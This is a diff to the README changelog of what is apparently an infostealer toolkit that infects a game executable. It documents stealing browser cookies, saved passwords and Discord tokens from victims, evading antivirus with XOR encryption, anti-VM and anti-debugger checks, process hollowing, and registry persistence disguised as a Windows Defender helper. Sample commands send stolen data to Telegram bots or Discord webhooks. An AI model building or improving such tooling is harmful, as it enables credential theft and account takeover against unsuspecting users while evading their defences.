@@ -65,7 +65,47 @@ auto.bat
 
 ## What's New
 
-### `auto.py` — one-click payload setup (GUI + CLI)
+### v2 — payload improvements (current)
+
+**Chromium cookie fix (browser-locked DBs):** `CopyFileW` was replaced with
+`CreateFileW(FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)` + manual `ReadFile`.
+This bypasses the exclusive lock Chrome/Edge hold on their live cookie databases —
+cookies are now extracted even when the browser is running (previously only Firefox worked).
+
+**More browsers:** Chromium, Thorium, CocCoc, and Yandex Browser added to the browser
+profile list (9 total: Chrome, Edge, Brave, Vivaldi, Opera, Chromium, Thorium, CocCoc, Yandex).
+
+**Discord token extraction:** Scans Discord's LevelDB files (`%APPDATA%\Discord\Local Storage\
+leveldb\*.ldb`) for MFA tokens (`mfa.*` pattern) and exfiltrates them as cookie-like entries.
+
+**Browser password extraction:** Reads Chromium `Login Data` SQLite DBs, decrypts saved
+passwords with the same AES-256-GCM key used for cookies (v10/v11/v20), and exfiltrates
+them with the associated username and origin URL.
+
+**XOR-encrypted payload:** The embedded DLL in `loader.exe` is now XOR-encrypted (16-byte key)
+to prevent AV string scanning of cookie-extraction strings (`moz_cookies`, `encrypted_key`,
+`Login Data`, etc). The loader decrypts in memory before process hollowing.
+
+**Anti-analysis:** The payload now checks for:
+- VM MAC address prefixes (VMware, VirtualBox, Hyper-V, QEMU)
+- Debuggers (`IsDebuggerPresent`, `CheckRemoteDebuggerPresent`)
+- Analysis processes (x64dbg, IDA, Wireshark, Process Hacker, etc.)
+- Sleep acceleration (sandbox timing check)
+If any check fails, the payload exits silently without extracting cookies.
+
+**Persistence:** `--persist` flag patches a sentinel in the loader that makes the payload
+install a `HKCU\...\Run\WindowsDefenderHelper` registry key on the victim, re-executing
+the infected exe on every login.
+
+**Telegram + Discord relay:** `listen.py` can relay received cookie summaries to Telegram
+Bot API or Discord webhooks, bypassing firewall restrictions on the attacker's C2:
+
+```bat
+python auto.py game.exe --telegram 123456:ABC-DEF@bot:987654321
+python auto.py game.exe --discord https://discord.com/api/webhooks/123/abc
+```
+
+### v1 — `auto.py` one-click setup (GUI + CLI)
 
 A single script that does everything: builds binaries, detects your IP, starts the listener,
 infects the target, and optionally runs it locally for testing. Replaces the manual
